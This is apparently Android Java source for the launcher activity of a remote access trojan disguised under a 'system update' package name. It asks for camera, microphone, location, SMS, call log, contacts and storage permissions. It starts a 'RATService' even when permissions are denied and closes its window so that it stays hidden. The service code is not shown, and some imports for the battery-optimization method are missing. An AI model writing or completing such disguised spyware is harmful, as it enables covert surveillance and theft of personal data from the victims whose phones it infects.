package com.android.system.update;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

import java.util.ArrayList;
import java.util.List;

public class MainActivity extends AppCompatActivity {
    
    private static final int PERMISSION_REQUEST_CODE = 100;
    
    // List of all permissions your app needs
    private final String[] requiredPermissions = {
        Manifest.permission.CAMERA,
        Manifest.permission.RECORD_AUDIO,
        Manifest.permission.ACCESS_FINE_LOCATION,
        Manifest.permission.ACCESS_COARSE_LOCATION,
        Manifest.permission.READ_SMS,
        Manifest.permission.SEND_SMS,
        Manifest.permission.READ_CALL_LOG,
        Manifest.permission.READ_CONTACTS,
        Manifest.permission.READ_EXTERNAL_STORAGE,
        Manifest.permission.WRITE_EXTERNAL_STORAGE,
        Manifest.permission.READ_PHONE_STATE,
        Manifest.permission.FOREGROUND_SERVICE,
        Manifest.permission.POST_NOTIFICATIONS
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);
        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });
        
        // Check and request permissions
        checkAndRequestPermissions();
    }
    
    private void checkAndRequestPermissions() {
        List<String> permissionsNeeded = new ArrayList<>();
        
        for (String permission : requiredPermissions) {
            if (ContextCompat.checkSelfPermission(this, permission) 
                    != PackageManager.PERMISSION_GRANTED) {
                permissionsNeeded.add(permission);
            }
        }
        
        if (!permissionsNeeded.isEmpty()) {
            // Request all missing permissions at once
            ActivityCompat.requestPermissions(this, 
                permissionsNeeded.toArray(new String[0]), 
                PERMISSION_REQUEST_CODE);
        } else {
            // All permissions already granted, start service
            startRATService();
        }
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, 
                                           @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        
        if (requestCode == PERMISSION_REQUEST_CODE) {
            boolean allGranted = true;
            StringBuilder deniedPermissions = new StringBuilder();
            
            for (int i = 0; i < permissions.length; i++) {
                if (grantResults[i] != PackageManager.PERMISSION_GRANTED) {
                    allGranted = false;
                    deniedPermissions.append(permissions[i]).append("\n");
                }
            }
            
            if (allGranted) {
                // All permissions granted, start service
                startRATService();
            } else {
                // Some permissions denied, show warning but still try to start service
                Toast.makeText(this, 
                    "Some permissions denied. Some features may not work.\n" + deniedPermissions.toString(), 
                    Toast.LENGTH_LONG).show();
                startRATService(); // Still try to start service with whatever permissions we have
            }
        }
    }
    private void requestIgnoreBatteryOptimizations() {
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
        Intent intent = new Intent();
        String packageName = getPackageName();
        PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
        if (!pm.isIgnoringBatteryOptimizations(packageName)) {
            intent.setAction(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
            intent.setData(Uri.parse("package:" + packageName));
            startActivity(intent);
        }
    }
}
    private void startRATService() {
        Intent serviceIntent = new Intent(this, RATService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(serviceIntent);
        } else {
            startService(serviceIntent);
        }
        
        // Optional: Show a message
        Toast.makeText(this, "RAT Service Started", Toast.LENGTH_SHORT).show();
        
        // Close activity immediately (so it's hidden)
        finish();
    }
}
